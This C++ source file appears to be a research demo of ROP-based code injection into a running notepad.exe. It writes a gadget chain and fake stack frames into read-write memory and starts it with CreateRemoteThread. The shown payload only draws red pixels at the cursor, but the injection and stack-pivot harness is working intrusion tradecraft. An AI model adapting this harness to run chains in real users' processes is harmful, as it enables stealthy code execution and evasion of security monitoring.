#include <windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <cstring>

// Returns the process ID of the first running image whose executable name matches szProcName.
DWORD GetProcessIdByName(const wchar_t* szProcName)
{
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe32{};
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32))
        {
            do
            {
                if (_wcsicmp(pe32.szExeFile, szProcName) == 0)
                {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return pid;
}

// Returns the load base of szModuleName in the target process, or 0 if the module is not loaded.
uint64_t GetRemoteModuleBase(HANDLE hProcess, DWORD pid, const wchar_t* szModuleName)
{
    uint64_t baseAddr = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        MODULEENTRY32 me32{};
        me32.dwSize = sizeof(MODULEENTRY32);
        if (Module32First(hSnap, &me32))
        {
            do
            {
                if (_wcsicmp(me32.szModule, szModuleName) == 0)
                {
                    baseAddr = (uint64_t)me32.modBaseAddr;
                    break;
                }
            } while (Module32Next(hSnap, &me32));
        }
        CloseHandle(hSnap);
    }
    return baseAddr;
}

// Allocates size bytes in the target process; returns a 16-byte-aligned RW pointer (or nullptr).
LPVOID VirtualAllocExAligned16(HANDLE hProcess, SIZE_T size)
{
    SIZE_T realAlloc = size + 0x10;
    LPVOID pRaw = VirtualAllocEx(hProcess, nullptr, realAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRaw)
        return nullptr;
    uint64_t v = (uint64_t)pRaw;
    uint64_t aligned = ((v + 0xF) & (~0xFULL));
    return (LPVOID)aligned;
}

/*
 * Notepad pixel-tracer ROP demo — memory map
 * =============================================================================
 * Primary block: VirtualAllocEx(..., 0x2000) — 8 KiB RW @ blockBase
 *
 *                              high VA
 *                    +---------------------------+  blockBase + 0x2000
 *     Region A       |  ROP chain (4 KiB)        |  A_base = blockBase + 0x1000
 *     (chain)        |  lpParameter -> A_base    |  resume labels: A_pos1..4, loop @ A_pin
 *                    + - - - - - - - - - - - - - +  blockBase + 0x1000
 *     Region B       |  Data (4 KiB)              |  B_base = blockBase
 *     (scratch)      |  +0x00 hDC (QWORD)          |
 *                    |  +0x08 POINT {x,y}          |
 *                    |  +0x20 DelayInterval (LI)     |
 *                    +---------------------------+  blockBase (low VA)
 *
 * Four separate 8 KiB allocations (16-byte aligned), each with a 3-QWORD
 * synthetic frame at (Mem*_base - 0x40):
 *
 *   MemB  -> GetDC(NULL)          returns to A_pos1
 *   MemA  -> GetCursorPos         returns to A_pos2
 *   MemC  -> NtGdiSetPixel        returns to A_pos3
 *   MemD  -> NtDelayExecution     returns to A_pos4 -> pop rsp to A_pin (loop)
 *
 * Mem*_base = aligned_alloc + 0x2000 (top of the 8 KiB slot; stack grows down).
 *
 * Loop: GetDC -> store hDC -> GetCursorPos -> marshal SetPixel args -> red pixel
 *       at cursor -> ~500 ms delay -> branch to A_pin (index 7).
 *
 * Gadget RVAs are build-specific; index with Hawkeye ROP on the same target image.
 */

int main()
{
    const wchar_t* TARGET_PROC = L"notepad.exe";

    // --- 1. Resolve the Notepad process ID ---
    DWORD pid = GetProcessIdByName(TARGET_PROC);
    if (pid == 0)
    {
        std::wcout << L"[!] Target process not found: " << TARGET_PROC << std::endl;
        return -1;
    }
    std::cout << "[+] Target PID: " << pid << std::endl;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == nullptr)
    {
        std::cout << "[!] OpenProcess failed, Err:" << GetLastError() << std::endl;
        return -1;
    }

    // --- 2. Module bases for gadgets used by this chain ---
    uint64_t base_nvwgf2umx = GetRemoteModuleBase(hProcess, pid, L"nvwgf2umx.dll");
    uint64_t base_ntdll = GetRemoteModuleBase(hProcess, pid, L"ntdll.dll");
    uint64_t base_combase = GetRemoteModuleBase(hProcess, pid, L"combase.dll");
    uint64_t base_d2d1 = GetRemoteModuleBase(hProcess, pid, L"d2d1.dll");
    uint64_t base_kernel32 = GetRemoteModuleBase(hProcess, pid, L"kernel32.dll");
    uint64_t base_kernelbase = GetRemoteModuleBase(hProcess, pid, L"kernelbase.dll");

    if (!base_nvwgf2umx || !base_ntdll || !base_combase || !base_d2d1 || !base_kernel32 || !base_kernelbase)
    {
        std::cout << "[!] Failed to resolve module bases; ensure Notepad loaded the DLLs listed above."
                  << std::endl;
        CloseHandle(hProcess);
        return -1;
    }
    std::cout << "[+] nvwgf2umx.dll base: 0x" << std::hex << base_nvwgf2umx << std::endl;
    std::cout << "[+] ntdll.dll base:     0x" << std::hex << base_ntdll << std::endl;
    std::cout << "[+] combase.dll base:   0x" << std::hex << base_combase << std::endl;
    std::cout << "[+] d2d1.dll base:      0x" << std::hex << base_d2d1 << std::endl;
    std::cout << "[+] kernel32.dll base:  0x" << std::hex << base_kernel32 << std::endl;
    std::cout << "[+] kernelbase.dll base:0x" << std::hex << base_kernelbase << std::endl;

    // --- 3. Gadget VAs (module base + RVA; version-bound) ---
    uint64_t gadget_entry = base_nvwgf2umx + 0x3c297e;           // push rcx; pop rsp; ret
    uint64_t gadget_pop_rcx_ret = base_ntdll + 0x12429e;           // pop rcx; ret
    uint64_t gadget_pop_rdx_ret = base_kernelbase + 0x184ce9;    // pop rdx; ret
    uint64_t gadget_pop_r8_ret = base_ntdll + 0x62de9;             // pop r8; ret
    uint64_t gadget_pop_r9_ret = base_nvwgf2umx + 0x1201eb3;       // pop r9; ret
    uint64_t gadget_pop_rsp_ret = base_ntdll + 0x151c3;            // pop rsp; ret
    uint64_t gadget_pop_rax_ret = base_ntdll + 0x615da;            // pop rax; ret

    uint64_t gadget_mov_mem_rcx_rax_ret = base_ntdll + 0xe7ed3;    // mov [rcx], rax ; ret
    uint64_t gadget_mov_mem_rcx_eax_ret = base_ntdll + 0xe09d8;    // mov [rcx], eax ; ret
    uint64_t gadget_mov_rcx_rax_ret = base_combase + 0xc458c;      // mov rcx, rax ; ...
    uint64_t gadget_xchg_edx_eax_ret = base_kernel32 + 0x4c89b;    // xchg edx, eax ; ret
    uint64_t gadget_mov_r8d_eax_ret = base_d2d1 + 0x708f6;         // mov r8d, eax ; ...
    uint64_t gadget_mov_eax_deref_rax_ret = base_ntdll + 0x448d7;  // mov eax, [rax] ; ret

    // --- 4. Resolve API VAs (local LoadLibrary; same VAs in target for this demo) ---
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    HMODULE hGdi32 = LoadLibraryA("gdi32.dll");
    HMODULE hKernel32Local = LoadLibraryA("kernel32.dll");
    HMODULE hWin32u = LoadLibraryA("win32u.dll");
    if (!hUser32 || !hGdi32 || !hKernel32Local || !hWin32u)
    {
        std::cout << "[!] LoadLibrary failed." << std::endl;
        CloseHandle(hProcess);
        return -1;
    }
    uint64_t pGetDC = (uint64_t)GetProcAddress(hUser32, "GetDC");
    uint64_t pGetCursorPos = (uint64_t)GetProcAddress(hUser32, "GetCursorPos");
    uint64_t pSetPixel = (uint64_t)GetProcAddress(hGdi32, "SetPixel");
    uint64_t pZwGdiSetPixel = (uint64_t)GetProcAddress(hWin32u, "NtGdiSetPixel");
    uint64_t pSleep = (uint64_t)GetProcAddress(hKernel32Local, "Sleep");
    uint64_t pNtDelayExecution = (uint64_t)GetProcAddress((HMODULE)base_ntdll, "NtDelayExecution");
    std::cout << "[+] GetDC VA:              0x" << std::hex << pGetDC << std::endl;
    std::cout << "[+] GetCursorPos VA:       0x" << std::hex << pGetCursorPos << std::endl;
    std::cout << "[+] SetPixel VA:           0x" << std::hex << pSetPixel << std::endl;
    std::cout << "[+] NtGdiSetPixel VA:      0x" << std::hex << pZwGdiSetPixel << std::endl;
    std::cout << "[+] Sleep VA:              0x" << std::hex << pSleep << std::endl;
    std::cout << "[+] NtDelayExecution VA:   0x" << std::hex << pNtDelayExecution << std::endl;

    uint64_t gadget_mov_rax_deref_rcx_ret = (uint64_t)hUser32 + 0x92fc7; // mov rax, [rcx] ; ret

    // --- 5. Primary 8 KiB block — see layout diagram at top of file ---
    LPVOID pRopAllBlock = VirtualAllocEx(hProcess, nullptr, 0x2000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRopAllBlock)
    {
        std::cout << "[!] VirtualAllocEx (8 KiB block) failed. Err:" << GetLastError() << std::endl;
        FreeLibrary(hUser32);
        FreeLibrary(hGdi32);
        FreeLibrary(hKernel32Local);
        FreeLibrary(hWin32u);
        CloseHandle(hProcess);
        return -1;
    }
    uint64_t blockBase = (uint64_t)pRopAllBlock;
    uint64_t B_base = blockBase;          // Region B (+0x0000): low 4 KiB — data
    uint64_t A_base = blockBase + 0x1000; // Region A (+0x1000): high 4 KiB — ROP chain
    std::cout << "[+] blockBase: 0x" << std::hex << blockBase << std::endl;
    std::cout << "[+] A_base:    0x" << std::hex << A_base << std::endl;
    std::cout << "[+] B_base:    0x" << std::hex << B_base << std::endl;

    // Region B layout (offsets from B_base)
    uint64_t addr_hDC_store = B_base + 0x00;
    uint64_t addr_point_buf = B_base + 0x08;
    uint64_t addr_DelayInterval_pointer = B_base + 0x20;
    std::cout << "[+] hDC slot:           0x" << std::hex << addr_hDC_store << std::endl;
    std::cout << "[+] POINT buffer:       0x" << std::hex << addr_point_buf << std::endl;
    std::cout << "[+] DelayInterval ptr:  0x" << std::hex << addr_DelayInterval_pointer << std::endl;

    // --- 6. Four 8 KiB private stacks (synthetic API frames at Mem*_base - 0x40) ---
    LPVOID pMemA = VirtualAllocExAligned16(hProcess, 0x2000);
    LPVOID pMemB = VirtualAllocExAligned16(hProcess, 0x2000);
    LPVOID pMemC = VirtualAllocExAligned16(hProcess, 0x2000);
    LPVOID pMemD = VirtualAllocExAligned16(hProcess, 0x2000);
    if (!pMemA || !pMemB || !pMemC || !pMemD)
    {
        std::cout << "[!] Private stack allocation failed." << std::endl;
        VirtualFreeEx(hProcess, pRopAllBlock, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pMemA, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pMemB, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pMemC, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pMemD, 0, MEM_RELEASE);
        FreeLibrary(hUser32);
        FreeLibrary(hGdi32);
        FreeLibrary(hKernel32Local);
        FreeLibrary(hWin32u);
        CloseHandle(hProcess);
        return -1;
    }
    uint64_t MemA_base = (uint64_t)pMemA + 0x2000;
    uint64_t MemB_base = (uint64_t)pMemB + 0x2000;
    uint64_t MemC_base = (uint64_t)pMemC + 0x2000;
    uint64_t MemD_base = (uint64_t)pMemD + 0x2000;
    std::cout << "[+] MemA (GetCursorPos) top: 0x" << std::hex << MemA_base << std::endl;
    std::cout << "[+] MemB (GetDC) top:        0x" << std::hex << MemB_base << std::endl;
    std::cout << "[+] MemC (SetPixel) top:     0x" << std::hex << MemC_base << std::endl;
    std::cout << "[+] MemD (delay) top:        0x" << std::hex << MemD_base << std::endl;

    // --- 7. Resume labels in Region A (A_base + index * 8) ---
    const size_t off_pos1 = 4 * sizeof(uint64_t);
    const size_t off_pos2 = 11 * sizeof(uint64_t);
    const size_t off_pos3 = 31 * sizeof(uint64_t);
    const size_t off_pos4 = 37 * sizeof(uint64_t);
    uint64_t A_pos1 = A_base + off_pos1;
    uint64_t A_pos2 = A_base + off_pos2;
    uint64_t A_pos3 = A_base + off_pos3;
    uint64_t A_pos4 = A_base + off_pos4;
    std::cout << "[+] A_pos1 (after GetDC):        0x" << std::hex << A_pos1 << std::endl;
    std::cout << "[+] A_pos2 (after GetCursorPos): 0x" << std::hex << A_pos2 << std::endl;
    std::cout << "[+] A_pos3 (after SetPixel):     0x" << std::hex << A_pos3 << std::endl;
    std::cout << "[+] A_pos4 (after delay):        0x" << std::hex << A_pos4 << std::endl;

    const size_t off_pin = 7 * sizeof(uint64_t);
    uint64_t A_pin = A_base + off_pin;
    std::cout << "[+] A_pin (loop head):           0x" << std::hex << A_pin << std::endl;

    // --- 8. Install synthetic stack frames (3 QWORDs each) ---
    uint64_t frameMemB[] = { pGetDC, gadget_pop_rsp_ret, A_pos1 };
    WriteProcessMemory(hProcess, (LPVOID)(MemB_base - 0x40), frameMemB, sizeof(frameMemB), nullptr);
    uint64_t frameMemA[] = { pGetCursorPos, gadget_pop_rsp_ret, A_pos2 };
    WriteProcessMemory(hProcess, (LPVOID)(MemA_base - 0x40), frameMemA, sizeof(frameMemA), nullptr);
    uint64_t frameMemC[] = { pZwGdiSetPixel, gadget_pop_rsp_ret, A_pos3 };
    WriteProcessMemory(hProcess, (LPVOID)(MemC_base - 0x40), frameMemC, sizeof(frameMemC), nullptr);
    uint64_t frameMemD[] = { pNtDelayExecution, gadget_pop_rsp_ret, A_pos4 };
    WriteProcessMemory(hProcess, (LPVOID)(MemD_base - 0x40), frameMemD, sizeof(frameMemD), nullptr);

    LARGE_INTEGER DelayInterval;
    DelayInterval.QuadPart = -500 * 10000; // 500 ms relative interval for NtDelayExecution
    WriteProcessMemory(hProcess, (LPVOID)addr_DelayInterval_pointer, &DelayInterval, sizeof(LARGE_INTEGER), nullptr);

    // --- 9. Region A: main ROP chain ---
    uint64_t ropChain[] = {
        // [0..3] Call GetDC(NULL) via MemB
        gadget_pop_rcx_ret,  // [0]
        0ULL,                // [1] hWnd = NULL
        gadget_pop_rsp_ret,  // [2]
        MemB_base - 0x40,    // [3] RSP -> MemB frame

        // [4..6] A_pos1: GetDC returned — store hDC in Region B
        gadget_pop_rcx_ret,         // [4] << resume
        addr_hDC_store,             // [5]
        gadget_mov_mem_rcx_eax_ret, // [6] [hDC_store] = eax

        // [7..10] Loop head (A_pin): GetCursorPos via MemA
        gadget_pop_rcx_ret,  // [7] << A_pin
        addr_point_buf,        // [8]
        gadget_pop_rsp_ret,  // [9]
        MemA_base - 0x40,    // [10] RSP -> MemA frame

        // [11..30] A_pos2: marshal NtGdiSetPixel(hDC, X, Y, color)
        gadget_pop_rcx_ret,          // [11] << resume
        addr_hDC_store,              // [12]
        gadget_mov_rax_deref_rcx_ret,// [13] rax = hDC
        gadget_mov_rcx_rax_ret,      // [14] rcx = hDC
        gadget_pop_rax_ret,          // [15]
        addr_point_buf,              // [16]
        gadget_mov_eax_deref_rax_ret,// [17] eax = POINT.x
        gadget_pop_rdx_ret,          // [18]
        0ULL,                        // [19]
        gadget_xchg_edx_eax_ret,     // [20] rdx = X
        gadget_pop_rax_ret,          // [21]
        addr_point_buf + 4,          // [22] &Y
        gadget_mov_eax_deref_rax_ret,// [23] eax = POINT.y
        gadget_pop_r8_ret,           // [24]
        0ULL,                        // [25]
        gadget_mov_r8d_eax_ret,      // [26] r8 = Y
        gadget_pop_r9_ret,           // [27]
        0x00FF0000ULL,               // [28] r9 = RGB red
        gadget_pop_rsp_ret,          // [29]
        MemC_base - 0x40,            // [30] RSP -> MemC frame

        // [31..36] A_pos3: NtDelayExecution via MemD
        gadget_pop_rcx_ret,          // [31] << resume
        0ULL,                        // [32] Alertable = FALSE
        gadget_pop_rdx_ret,          // [33]
        addr_DelayInterval_pointer,  // [34]
        gadget_pop_rsp_ret,          // [35]
        MemD_base - 0x40,            // [36] RSP -> MemD frame

        // [37..38] A_pos4: loop back to A_pin
        gadget_pop_rsp_ret,          // [37]
        A_pin                        // [38] RSP -> index 7
    };

    size_t ropChainSize = sizeof(ropChain);
    WriteProcessMemory(hProcess, (LPVOID)A_base, ropChain, ropChainSize, nullptr);
    std::cout << "[+] ROP chain written to region A (" << std::dec << ropChainSize << " bytes)" << std::endl;

    // --- 10. Start remote thread (entry gadget; lpParameter = A_base) ---
    HANDLE hRemoteThread = CreateRemoteThread(
        hProcess,
        nullptr,
        0,
        (LPTHREAD_START_ROUTINE)gadget_entry,
        (LPVOID)A_base,
        0,
        nullptr
    );
    if (!hRemoteThread)
    {
        std::cout << "[!] CreateRemoteThread failed. Err:" << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRopAllBlock, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pMemA, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pMemB, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pMemC, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pMemD, 0, MEM_RELEASE);
        FreeLibrary(hUser32);
        FreeLibrary(hGdi32);
        FreeLibrary(hKernel32Local);
        FreeLibrary(hWin32u);
        CloseHandle(hProcess);
        return -1;
    }
    std::cout << "[+] Remote thread created, handle: " << hRemoteThread << std::endl;
    std::cout << "[*] ROP running (red pixel trail at cursor)..." << std::endl;
    WaitForSingleObject(hRemoteThread, INFINITE);
    std::cout << "[+] Remote thread finished." << std::endl;

    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, pRopAllBlock, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pMemA, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pMemB, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pMemC, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pMemD, 0, MEM_RELEASE);
    FreeLibrary(hUser32);
    FreeLibrary(hGdi32);
    FreeLibrary(hKernel32Local);
    FreeLibrary(hWin32u);
    CloseHandle(hProcess);
    return 0;
}
